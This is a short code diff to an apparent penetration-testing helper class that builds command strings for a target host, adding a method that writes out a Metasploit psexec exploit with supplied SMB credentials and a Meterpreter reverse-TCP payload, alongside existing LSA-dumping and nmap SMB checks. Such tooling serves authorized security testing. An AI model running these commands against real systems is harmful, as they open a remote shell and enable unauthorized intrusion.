@@ -150,6 +150,7 @@ class CreateTests:
         # Generate tests
         output += self.cme_lsa() + self.util.seperator_line()
         output += self.smb_security() + self.util.seperator_line()
+        output += self.meterpreter_shell() + self.util.seperator_line()
             
         self.save_results(output, './reports', str(self.host_ip) + ".txt")
 
@@ -170,6 +171,13 @@ class CreateTests:
         cmd = 'nmap -p 445 --script smb2-security-mode {0}\n'.format(self.host_ip)
 
         #output = self.util.execute_command(cmd)
+        return cmd
+    
+    def meterpreter_shell(self):
+        """
+        Meterpreter Reverse Shell
+        """
+        cmd = 'use exploit/windows/smb/psexec \nset PAYLOAD windows/x64/meterpreter/reverse_tcp \nset LPORT 14568 \nset SMBDomain {0} \nset SMBUser {1} \nset SMBPass {2} \nset RHOST {3} \nset RPORT 445 \nexploit'.format(self.domain, self.username, self.password, self.host_ip)
         return cmd
         
     def save_results(self, results, folder_name, file_name):
